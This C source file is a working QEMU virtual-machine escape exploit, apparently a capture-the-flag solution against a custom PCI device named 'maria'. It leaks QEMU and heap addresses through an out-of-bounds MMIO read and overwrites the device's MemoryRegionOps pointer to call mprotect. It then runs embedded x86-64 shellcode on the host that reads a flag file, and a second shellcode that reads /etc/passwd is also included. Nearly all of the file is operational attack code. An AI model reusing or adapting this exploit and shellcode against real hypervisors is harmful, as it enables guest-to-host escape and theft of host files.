/*
r -L /home/diegoaltf4/vm-escape/wall_maria/share/bios -kernel /home/diegoaltf4/vm-escape/wall_maria/share/bzImage -initrd /home/diegoaltf4/vm-escape/wall_maria/share/initramfs-patched.cpio.gz -cpu kvm64,+smep,+smap -monitor none -m 1024M -append "console=ttyS0 oops=panic panic=1 quiet" -monitor /dev/null -nographic -no-reboot -net user -net nic -device e1000 -device maria -sandbox on,obsolete=deny,elevateprivileges=deny,spawn=deny,resourcecontrol=deny -s
*/

#include <sys/types.h>
#include <sys/mman.h>
#include <inttypes.h>
#include <stdlib.h>
#include <stdio.h>
#include <fcntl.h>
#include <err.h>
#include <assert.h>
#include <string.h>
#include <unistd.h>

#define PAGE_SIZE 0x1000
#define BUFF_SIZE 0x2000
#define MEMORY_RW 0x00
#define STATE_SRC 0x04
#define STATE_OFF 0x08
#define MMIO_SIZE 0x10000

volatile void* mmio_mem;

uint32_t mmio_read(uint32_t offset)
{
    return *(uint32_t *)(mmio_mem + offset);
}

uint32_t mmio_write(uint32_t offset, uint32_t value)
{
    *(uint32_t *)(mmio_mem + offset) = value;
}

void set_maria_source(uint32_t source_value)
{
    mmio_write(STATE_SRC, source_value);
}

void set_maria_offset(uint32_t offset_value)
{
    mmio_write(STATE_OFF, offset_value);
}

uint32_t get_maria_buff()
{
    return mmio_read(MEMORY_RW);
}

void set_maria_buff()
{
    mmio_write(MEMORY_RW, 0);
}

uint64_t gva2gpa(void *addr)
{
    uint64_t page = 0;
    int fd = open("/proc/self/pagemap", O_RDONLY);
    if (fd < 0) err(EXIT_FAILURE, "open gva2gpa");
    lseek(fd, ((uint64_t)addr / PAGE_SIZE) * 8, SEEK_SET);
    read(fd, &page, 8);
    return ((page & 0x7fffffffffffff) * PAGE_SIZE) | ((uint64_t)addr & 0xfff);
}


int main()
{

    int fd, finish = 0;
    uint64_t buff_phys, buff_phys_0x1000, *maria_mmio_ops, qemu_base_addr, *maria_object, maria_buffer, mprotect;
    char *buffer;

    fd = open("/sys/devices/pci0000:00/0000:00:05.0/resource0", O_RDWR | O_SYNC);
    if (fd < 0) err(EXIT_FAILURE, "open");

    printf("[+] fd    ==> %i [+]\n", fd);

    mmio_mem = mmap(NULL, MMIO_SIZE, PROT_READ | PROT_WRITE, MAP_SHARED, fd, 0);
    if (mmio_mem == MAP_FAILED) err(EXIT_FAILURE, "mmap");

    // just to check that we are interacting well with the device
    printf("[+] value ==> %x [+]\n", mmio_read(0));
    printf("[+] value ==> %x [+]\n", mmio_read(0xf0));

    system("echo 512 > /proc/sys/vm/nr_hugepages"); //to achieve that they are in consecutive physical memory so the physical memory oob allows us to reach MemoryRegion mmio

    do{

      buffer = mmap(0, BUFF_SIZE, PROT_READ | PROT_WRITE, MAP_SHARED | MAP_ANONYMOUS | MAP_NONBLOCK, -1, 0);
      if (buffer == MAP_FAILED) err(EXIT_FAILURE, "mmap");
      memset(buffer, 0x41, BUFF_SIZE);
      buff_phys = gva2gpa(buffer);
      buff_phys_0x1000 = gva2gpa(buffer + PAGE_SIZE);
      if (buff_phys + PAGE_SIZE == buff_phys_0x1000) finish = 1;

    }while (!finish);

    printf("buffer addr %p\n", buffer);
    printf("buffer phys 0x%lx\n", buff_phys);

    set_maria_source(buff_phys);
    set_maria_offset(0xf0);
    get_maria_buff();

    
    maria_mmio_ops = (uint64_t*)(buffer + 0x2000 - 0xf0 + 0x48); //at offset 0x48 we have the pointer to the structure

    printf("maria_mmio_ops p @ %p\n", maria_mmio_ops);
    printf("maria_mmio_ops         @ 0x%lx\n", *maria_mmio_ops);
    qemu_base_addr = (uint64_t)(*maria_mmio_ops) - 0xf1ff80;
    printf("qemu_base_addr         @ %p\n", (void *)qemu_base_addr);
    maria_object = (uint64_t*)(buffer + 0x2000 + 0x20 - 0xf0);
    printf("maria_object p   @ %p\n", maria_object);
    printf("maria_object           @ 0x%lx\n", *maria_object);
    maria_buffer = (uint64_t)(*maria_object) + 0xa30 + 0xf0;
    printf("maria buffer           @ %p\n", (void *)maria_buffer);
    mprotect = (uint64_t) (qemu_base_addr + 0x30c400);
    printf("mprotect               @ %p\n", (void *)mprotect);

    //memset(buffer, 0x42, PAGE_SIZE);

    //printf("[+] Press enter [+]\n");
    //getchar();

    //memset(buffer, 0x44, BUFF_SIZE);

    set_maria_offset(0x00);
    set_maria_buff();

    //now if we inspect the address of maria_buffer we should see the 0x44...
    //printf("[+] Press enter [+]\n");
    //getchar();

    uint64_t *buffer_u64 = (uint64_t *)buffer; // just to access using [] easily

    /*
      mov rax, 2
      xor rsi, rsi
      xor rdx, rdx
      mov r9, 0x67616c662f7265
      push r9
      mov r9, 0x73752f656d6f682f
      push r9
      mov rdi, rsp
      syscall

      mov rdi, rax
      xor rax, rax
      mov rsi, rsp
      mov rdx, 0x2000
      syscall

      mov rdx, rax
      mov rax, 1
      mov rdi, 1
      mov rsi, rsp
      syscall
    */

    char shellcode_flag[] =  {
      0x48, 0xC7, 0xC0, 0x02, 0x00, 0x00, 0x00, 0x48, 0x31, 0xF6, 0x48, 0x31, 0xD2, 0x49, 0xB9, 0x65, 0x72, 0x2F, 0x66, 0x6C, 0x61, 0x67, 0x00, 0x41, 0x51, 0x49, 0xB9, 0x2F, 0x68, 0x6F, 0x6D, 0x65, 0x2F, 0x75, 0x73, 0x41, 0x51, 0x48, 0x89, 0xE7, 0x0F, 0x05, 0x48, 0x89, 0xC7, 0x48, 0x31, 0xC0, 0x48, 0x89, 0xE6, 0x48, 0xC7, 0xC2, 0x00, 0x20, 0x00, 0x00, 0x0F, 0x05, 0x48, 0x89, 0xC2, 0x48, 0xC7, 0xC0, 0x01, 0x00, 0x00, 0x00, 0x48, 0xC7, 0xC7, 0x01, 0x00, 0x00, 0x00, 0x48, 0x89, 0xE6, 0x0F, 0x05
    };

    char shellcode[] = {
      0x48, 0xC7, 0xC0, 0x02, 0x00, 0x00, 0x00, 0x48, 0x31, 0xF6, 0x48, 0x31, 0xD2, 0x49, 0xC7, 0xC1, 0x73, 0x77, 0x64, 0x00, 0x41, 0x51, 0x49, 0xB9, 0x2F, 0x65, 0x74, 0x63, 0x2F, 0x70, 0x61, 0x73, 0x41, 0x51, 0x48, 0x89, 0xE7, 0x0F, 0x05, 0x48, 0x89, 0xC7, 0x48, 0x31, 0xC0, 0x48, 0x89, 0xE6, 0x48, 0xC7, 0xC2, 0x00, 0x20, 0x00, 0x00, 0x0F, 0x05, 0x48, 0x89, 0xC2, 0x48, 0xC7, 0xC0, 0x01, 0x00, 0x00, 0x00, 0x48, 0xC7, 0xC7, 0x01, 0x00, 0x00, 0x00, 0x48, 0x89, 0xE6, 0x0F, 0x05
    };

    // sys_mprotect --> 10(RAX) | unsigned long start	(RDI) | size_t len (RSI) | unsigned long prot (RDX)
    buffer_u64[0] = maria_buffer + 0x40;
    buffer_u64[1] = mprotect;
    memcpy(&buffer_u64[0x40], shellcode_flag, sizeof(shellcode_flag));

    buffer_u64[(0x2000 + 0x48 - 0xf0)/8] = maria_buffer; // const MemoryRegionOps *ops;
    buffer_u64[(0x2000 + 0x50 - 0xf0)/8] = (maria_buffer / BUFF_SIZE * BUFF_SIZE); // void *opaque; with this, we can control RDI (unsigned long start)

    set_maria_source(buff_phys);
    set_maria_offset(0xf0);
    set_maria_buff();

    //printf("Ready to trigger read\n");
    printf("mmio write %p\n",mmio_write);
    //getchar();
    //get_maria_buff();

    // BUFF_SIZE --> RSI | 0x7 --> prot
    mmio_write(BUFF_SIZE, 0x7); // trigger write (mprotect)
    mmio_read(0x00); // trigger read (shellcode)

    return 0;
}
